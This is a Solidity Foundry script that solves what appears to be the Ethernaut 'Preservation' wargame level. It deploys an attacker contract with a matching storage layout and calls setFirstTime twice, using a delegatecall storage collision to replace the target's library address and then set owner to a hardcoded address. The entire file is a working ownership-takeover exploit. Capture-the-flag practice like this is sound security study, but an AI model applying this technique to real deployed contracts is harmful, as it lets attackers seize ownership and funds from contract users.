// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

import "../instance/Level16.sol";
import "forge-std/Script.sol";

contract ExploitLevel16 is Script {
    Preservation instance = Preservation(0x9dc2DC6421704EB1161c7c5917C1CDdd0f5854B9);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackPreservation attackP = new AttackPreservation();
        uint256 addressThis = uint256(uint160(address(attackP)));
        instance.setFirstTime(addressThis);
        instance.setFirstTime(0);
        vm.stopBroadcast();

        console.log("Preservation owner:", instance.owner());
    }
}

contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = 0x9606e11178a83C364108e99fFFD2f7F75C99d801;
    }
}
